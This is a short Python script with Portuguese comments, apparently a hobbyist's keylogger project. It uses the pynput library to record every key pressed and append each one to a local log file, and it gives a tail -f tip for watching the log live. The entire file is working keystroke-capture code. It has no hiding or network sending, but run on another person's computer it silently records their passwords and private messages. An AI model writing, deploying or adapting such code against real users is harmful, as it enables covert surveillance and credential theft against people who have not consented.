# importando o método Listener para "ouvir" as teclas
from pynput.keyboard import Listener

import os
import time
import logging
from shutil import copyfile

# definindo o local para salvar o arquivo
logFile = "E:\Programação\KeyLogger\logger.txt"

# Definindo o local usando o PC da pessoa
# username = os.getlogin()
# logFile = f'/home/{username}/Projects/KeyLogger/'

# timeCorrent = time.strtime('%Y - %m - %d %H:%M:%S', time.localtime())

# logging.basicConfig(filename=timeCorrent)

def writeLog(key):
    # Função resposável por receber as teclas e escrever no arquivo de log

    #conventendo o input em string
    keydata = str(key)

    # abrindo o arquivo para adicionar o que foi precionando. Usando o "append" para adicionar uma nova linha
    with open(logFile, "a") as f:
        f.write(f'A teclada por: {keydata}\n')

# abrindo o LIstener para registrar as teclas quanto precionar
# quando o evendo on_press ocorrer, chamar função WriteLog
with Listener(on_press=writeLog) as l:
    l.join()
# usando o: tail -f /home/lucas/Projects/KeyLogger/logger.txt
# você acompanha o arquivo

# Teste aqui: 